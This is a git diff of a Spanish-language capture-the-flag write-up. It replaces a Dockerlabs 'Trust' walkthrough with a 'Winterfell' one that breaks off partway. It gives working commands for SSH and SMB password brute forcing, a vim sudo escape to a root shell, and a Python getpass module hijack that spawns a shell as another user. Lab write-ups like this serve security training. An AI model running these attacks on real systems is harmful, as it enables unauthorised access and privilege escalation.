@@ -1,6 +1,6 @@
-# Máquina Trust
+# Máquina Winterfell
 
-Dificultad -> Muy fácil
+Dificultad -> Fácil
 
 Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)
 
@@ -19,177 +19,243 @@ Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)
 
 Para el despliegue de la máquina tendremos que ejecutar el siguiente comando:
 ```shell
-sudo bash auto_deploy.sh trust.tar
+sudo bash auto_deploy.sh winterfell.tar
 ```
 
-
-## Reconocimiento
-
-Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.
-
-```shell
-nmap -p- --open -sv --min-rate 5000 -vvv -n -Pn 172.19.0.2 
-________________________________________________
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
-| ssh-hostkey: 
-|   256 19a11a42fa3a9d9a0fea917f7edba3c7 (ECDSA)
-|_  256 a6fdcf45a695052c5810738d39572bff (ED25519)
-80/tcp open  http    Apache httpd 2.4.57 ((Debian))
-|_http-server-header: Apache/2.4.57 (Debian)
-|_http-title: Apache2 Debian Default Page: It works
-MAC Address: 02:42:AC:11:00:02 (Unknown)
-***
-```
-
-Podemos ver que tenemos dos puertos abiertos que son el 22 (ssh) y el 80(http). El puerto 22 siempre puede ser importante para poder hacer fuerza bruta si sabemos un usuario y contraseña. Como el http está abierto, vamos a acceder a la IP en el buscador. Al acceder podemos ver que tiene una plantilla de Apache.
-
-![Plantilla](/images/plantilla_apache.png)
+Obtenemos la IP de la máquina:
+<img width="832" height="624" alt="imagen" src="https://github.com/user-attachments/assets/048f1bc2-b4e5-4a8d-8b86-d0c120da761d" />
 
 
-## Fuzzing
 
-Para poder obtener información acerca de la página que tienen alojada en la IP, vamos a usar fuzzing, que es una técnica que consiste en enviar datos aleatorios, inesperados o mal formados a un programa, servicio o aplicación para ver cómo responde. El objetivo principal es detectar errores, vulnerabilidades o fallos de seguridad.
+<br>
 
-Para ello vamos a utilizar la herrmaienta de fuzzing web gobuster para encontrar archivos o directorios web dentro de la página:
-
- ### Gobuster
-He probado distintas combinaciones en gobuster para ver si encontraba algo y he encontrado un php con el siguiente comando:
- ```bash
- gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak
----------------------------------------------------------------------------------
-/index.html           (Status: 200) [Size: 10701]
-/secret.php           (Status: 200) [Size: 927]  
-/server-status        (Status: 403) [Size: 275
- ```
-
-Este comando utiliza una wordlist que le proporcionamos con el parámetro -w para probar posibles directorios y archivos en la web.
-El parámetro -t indica el número de hilos concurrentes, acelerando el proceso de búsqueda.
-La opción -x permite probar diferentes extensiones (por ejemplo, .php, .html) sobre cada palabra de la wordlist.
-
-En conjunto, Gobuster intenta encontrar archivos o directorios en la URL o IP que le indicamos, que en este caso corresponde a la máquina objetivo donde está alojada la página web y la plantilla de Apache.
-
-![Gobuster](/images/gobuster_1.png)
-
-Al acceder a /secret.php podemos ver lo siguiente:
-
-![PHP](/images/secret_php.png)
-
-## Explotación
-Solo tenemos un vector de ataque con la información que tenemos. Sabemos que está abierto el puerto 22 y que hay un usuario llamada Mario. Por tanto vamos a realizar fuerza bruta a este puerto utilizando **hydra**.
-Tenemos que usar la wordlist rockyou que viene instalada ya en Kali. Suele venir instalado pero viene en un zip por lo que hay que descomprimirlo una vez. 
-Localiza el archivo:
+Como siempre empezamos escaneando la máquina objetivo:
 ```bash
-ls /usr/share/wordlists/rockyou.txt.gz
+nmap -sCV -p- --open --min-rate 5000 172.17.0.2 -vvv
 ```
+Nos encontramos lo siguiente:
+<img width="1581" height="802" alt="imagen" src="https://github.com/user-attachments/assets/1a499875-eaff-4f55-a9c5-c61d34204897" />
 
-Debería estar en:
-```swift
-/usr/share/wordlists/rockyou.txt.gz
-```
 
-Descomprimimos el archivo  (solo lo tenemos que hacer una vez):
-sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+Comprobamos que es una máquina Linux. Vemos una versión de SSh que de primeras no parece de las vulnerables, una web HTTP en Apache con título Juego de Tronos, y dos servicios Samba corriendo. Reocrdamos que Samba es la versión SMB que utiliza Linux. 
 
-Ahora ya podemos usar la wordlist:
-```swift
-/usr/share/wordlists/rockyou.txt
-```
+Vamos a empezar primero por ver y enumerar la web. Esto es la web que vemos:
 
-Bien, ahora ya podemos usar hyndra para obtener ka contraseña del usuario Mario para realizar luego ssh
-Usaremos el siguiene comando:
+
+<img width="1593" height="773" alt="imagen" src="https://github.com/user-attachments/assets/f143cf3f-9fca-44c4-b9f4-db6735f9647f" />
+
+
+
+Tenemos una simple web con varios nombres y un audio a reproducir. Los nombres puede ser de utilidad, los podemos guardar en una lista por si acaso:
 ```bash
-hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2 -t 4
+nano users.txt
+jon
+arya
+daenerys
+```
+También le debemos echar un vistazo al código fuente. Cómo tal no encontramos nada. Vamos a hacer fuzzing para encontrar rutas en la web. Voy a usar dirbuster:
+
+<img width="731" height="245" alt="imagen" src="https://github.com/user-attachments/assets/3153bce0-0c85-416e-8de5-e2d39572f388" />
+
+Tras usar dirbuster vemos que nso encuentra una ruta con código 200: /dragon. Vamos a acceder a ella:
+
+<img width="405" height="190" alt="imagen" src="https://github.com/user-attachments/assets/47536cc7-c87e-4a47-af76-38328d88bb73" />
+
+Accedemos al archivo ese "EpisodiosT1" y nos encontramos otra wordlist:
+
+<img width="694" height="186" alt="imagen" src="https://github.com/user-attachments/assets/f1747dbb-b62b-41e8-820a-9c412a27226f" />
+
+Vamos a añadir estos nombres a los anteriores:
+
+<img width="660" height="439" alt="imagen" src="https://github.com/user-attachments/assets/8286a947-bef9-4268-8b95-c58b945a8b53" />
+
+Parece que en la web no podemos acceder a mucho más. Con lo que tenemos podemos hacer varias cosas. Lo primero sería enumerar los recursos Samba y comprobar recursos compartidos. Podríamos probar fuerza bruta en Samba con estos usuarios que tenemos para ver si alguno existe en el servidor. Podremos aplicar también fuerza bruta de los usuarios sobre el servicio SSH:
+```bash
+smbclient -L //172.17.0.2 -N   # probar a listar y entrar con null session
+smbmap -H 172.17.0.2
+enum4linux -a 172.17.0.2
 ```
 
+Encontramos recursos interesantes con smbclient pese a no poder acceder a ellos con una null session:
 
-hydra → ejecuta la herramienta Hydra.
+<img width="1541" height="337" alt="imagen" src="https://github.com/user-attachments/assets/8439b0de-6eb9-45eb-9347-2b722af9fd67" />
 
--l mario → indica el usuario único que queremos atacar, en este caso mario.
+Con smbmap listamos los permisos de los recursos:
 
--P /usr/share/wordlists/rockyou.txt → indica la lista de contraseñas que Hydra va a probar para ese usuario.
+<img width="1411" height="209" alt="imagen" src="https://github.com/user-attachments/assets/aabafd70-e169-40c4-9147-9d06c2b7e397" />
 
-Hydra probará cada contraseña del archivo rockyou.txt contra el usuario mario.
+Y con enum4linux conseguimos enumerar usuarios existentes en el sistema:
 
-ssh://172.19.0.2 → especifica el servicio y la dirección del objetivo:
+<img width="1350" height="290" alt="imagen" src="https://github.com/user-attachments/assets/6b637ffd-bc18-4806-b22c-740b84aa0583" />
 
-ssh → protocolo que se va a atacar.
+Y vemos que son precisamente los usuarios de la web que anotamos. Podemos usar ahora herramientas como crackmapexec o netexec para hacer fuerza bruta:
 
-172.19.0.2 → IP de la máquina donde Hydra intentará conectarse.
+Hice dos intentos distintos porque si que es verdad que el contenido de EpisodiosT1 puede parecer más una wordlist de passwords que de users. Por tanto probé de las dos formas y también hice un users2.txt solo con los 3 usuarios de smb:
+```bash
+nano users2.txt
 
--t 4 → número de hilos concurrentes, es decir, Hydra hará 4 intentos al mismo tiempo para acelerar el proceso.
+jon
+arya
+daenerys
 
 
-![Hydra1](/images/hydra1.png)
+nano passwords.txt
 
-Obtenemos la contraseña, que como vemos es chocolate.
-
-Ya podemos realizar ssh para entrar como Mario
+as
+elloboyelleon
+unacoronadeoro
+ganasomueres
+porelladodelapunta
+baelor
+fuegoyhielo
+```
 
 ```bash
-ssh mario@172.19.0.2
+nxc smb 172.17.0.2 -u users2.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
+nxc smb 172.17.0.2 -u users2.txt -p passwords.txt
 ```
 
-### Tratamiento de la tty
+En ambos encontré credenciales:
 
-Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:
+<img width="1585" height="134" alt="imagen" src="https://github.com/user-attachments/assets/7aca90e9-3941-4163-a0a4-52af4f94bce9" />
 
-```shell
-script /dev/null -c bash 
-```
-(hacemos  **ctrl  +  Z**)
+<br>
 
-```shell
-stty raw -echo; fg
-reset xterm
-stty rows 62 columns 248
-export TERM=xterm
-export SHELL=bash
-```
+<img width="1582" height="109" alt="imagen" src="https://github.com/user-attachments/assets/6023035d-95ad-4ea1-9ce5-6b9ea3d9f957" />
 
-Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
-Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.
+Tenemos passwords para jon y arya: 
 
-## Escalada de privilegios
+- jon:seacercaelinvierno
+- arya:123456
 
-Usamos **sudo -l** para ver si podemos ejecutar algo como root:
+Ahora podemos enumerar que que permisos tienen estos users en recursos compartidos de Samba:
 
-```shell
-sudo -l
------------------------
-User mario may run the following commands on 78a58e094bf9:
-    (ALL) /usr/bin/vim
+```bash
+# jon
+nxc smb 172.17.0.2 -u jon -p 'seacercaelinvierno' --shares
+
+# arya
+nxc smb 172.17.0.2 -u arya -p '123456' --shares
 ```
 
-Podemos ejecutar **vim**. Si no sabemos como explotarlo para escalar privilegios, siempre podemos consultar -> [GTFOBins](https://gtfobins.github.io/)
+<img width="1579" height="515" alt="imagen" src="https://github.com/user-attachments/assets/0a4aa4e6-4f2e-4ac8-84dd-3584ff89b9d1" />
 
-```shell
-sudo vim -c ':!/bin/bash'
+Por tanto el usuario interesante aquí parece Jon. Vamos a entrar a su recurso compartido:
+
+<img width="1131" height="607" alt="imagen" src="https://github.com/user-attachments/assets/d87fed59-e6e7-49cb-a295-8f41d95bd5c3" />
+
+Nos traemos los archivos relevantes a Kali.
+
+Esto es lo que contienen:
+<img width="1090" height="695" alt="imagen" src="https://github.com/user-attachments/assets/68da19ad-ce3e-4d46-811e-b0cb8c9b8fce" />
+
+El bash history tambien puede ser interesante:
+<img width="556" height="338" alt="imagen" src="https://github.com/user-attachments/assets/30523543-7cf9-4052-80ba-d47732a14a53" />
+
+
+- paraJon → dice que Jon tiene una herramienta oculta para encriptar mensajes.
+- .mensaje.py → solo calcula el SHA-256 de un mensaje y solo pueden ejecutarlo jon o aria.
+- .bash_history → muestra que Jon ejecutaba .mensaje.py, pero no aparece ninguna otra herramienta.
+
+
+Vale, ahora vamos a acceder al recurso que tenía permisos de escritura jon: shared:
+```bash
+smbclient //172.17.0.2/shared -U 'jon'
 ```
 
-```shell
-whoami
-----------------
-root
+<img width="1540" height="507" alt="imagen" src="https://github.com/user-attachments/assets/a99fb5be-ae3d-45bc-9067-88544d87262b" />
+
+Nos proporcionan una password cifrada. Podemos intuir que es base64:
+
+- Usa solo letras A-Z, a-z, números y algunos símbolos permitidos.
+- Termina en = → es un padding muy típico de Base64.
+- Su longitud encaja con bloques de 4 caracteres.
+
+```bash
+echo 'aGlqb2RlbGFuaXN0ZXI=' | base64 -d
+```
+<img width="490" height="79" alt="imagen" src="https://github.com/user-attachments/assets/01da2190-ebe3-47dc-88df-980fe5806b4a" />
+
+Obtenemos una password. Puede que sea de Daenerys. Podemos intentar comprobarlo:
+```bash
+nxc smb 172.17.0.2 -u daenerys -p 'hijodelanister' --shares
 ```
 
-Hemos alcanzado el nivel de privilegios máximos en el sistema!
+Efectivamente es la password de Daenerys:
+<img width="1595" height="251" alt="imagen" src="https://github.com/user-attachments/assets/672db929-b342-46e6-949f-fa7ea6701780" />
 
 
+Parece que en Samba no hay mucho más por probar. Arya y Daenerys no tienen acceso a nada y Jon ya lo hemos comprobado. Quizás alguna de las passwords obtenidas es la password que permite el acceso a ssh de alguno. Tras probae encontramos que `hijodelanister` es la password de jon en ssh:
+```bash
+ssh jon@172.17.0.2
+```
+
+**Escalada de privilegios**
+
+Nos falta escalar privs en la sesión ssh.
+
+Lo primero es mirar `etc/passwd` para ver si encontramos los usuarios anteriores:
+
+<img width="744" height="545" alt="imagen" src="https://github.com/user-attachments/assets/47709163-4920-40e6-a8ab-277421d2daf6" />
+
+Efectivamente los encontramos. Podemos probar los distintos comandos de escalada. Entre ellos obtenemos algo interesante:
+<img width="1214" height="134" alt="imagen" src="https://github.com/user-attachments/assets/47fdd2a4-ed4d-4418-ad65-615fcc864679" />
+
+| Jon puede ejecutar .mensaje.py como aria sin introducir contraseña y aria tiene un binario de python que le permite ejecutar comandos como si fuese sudo.
+
+El problema es que .mensaje.py está pensado para ejecutar solamente el código del script. Pero como podemos modificarlo, podemos aprovechar Python para ejecutar comandos como aria.
+```bash
+ls -l /home/jon/.mensaje.py
+```
+No tenemos permisos de escritura. pero podemos ver el script:
+<img width="925" height="526" alt="imagen" src="https://github.com/user-attachments/assets/8cce3c34-3dfc-48f4-9ab0-5639a2c4de50" />
+
+`getpass` es un módulo de Python. Si conseguimos que Python cargue un getpass.py controlado por Jon en lugar del módulo legítimo, podríamos conseguir ejecución como aria:
+```bash
+touch getpass.py
+ls -l getpass.py
+
+nano getpass.py
+
+import os
+os.system("/bin/bash")
+```
+
+Si ejecutamos el script de antes como aria somos aria:
+```bash
+sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
+```
+
+<img width="801" height="76" alt="imagen" src="https://github.com/user-attachments/assets/d548e891-cc1d-43e3-a79d-62c5e8b1b0bc" />
+
+Volvemos a hacer `sudo -l` y nos encontramos algo similar:
+
+<img width="1225" height="144" alt="imagen" src="https://github.com/user-attachments/assets/7581966a-181d-4124-a285-52b47c0ea579" />
+
+Podemos ejecutar:
+```bash
+sudo -u daenerys cat ...
+sudo -u daenerys ls ...
+```
+Pero no una bash. Por tanto podemos ver sus archivos y leerlos:
 
 
+<img width="1546" height="411" alt="imagen" src="https://github.com/user-attachments/assets/6883d3ac-1ff7-4fb6-8c80-af4f25e2b1ba" />
 
+Nos da una password que usaremos luego:
+```bash
+su daenerys
+```
 
+Vamos a seguir leyendo archivos:
+```bash
+sudo -u daenerys /usr/bin/ls -la /home/daenerys/.secret
+```
+<img width="914" height="217" alt="imagen" src="https://github.com/user-attachments/assets/882ecb4b-81c9-4a1a-bdb1-ff14fdb4ed89" />
 
+Se puede ver ya desde el usuario daenerys:
 
+<img width="742" height="136" alt="imagen" src="https://github.com/user-attachments/assets/af17b253-c81c-4448-a15a-1f89a37bfacc" />
 
-
-
-
-
-
-
-
-
-
+Además si probamos `sudo -l` nos lleva a ese script también:
 
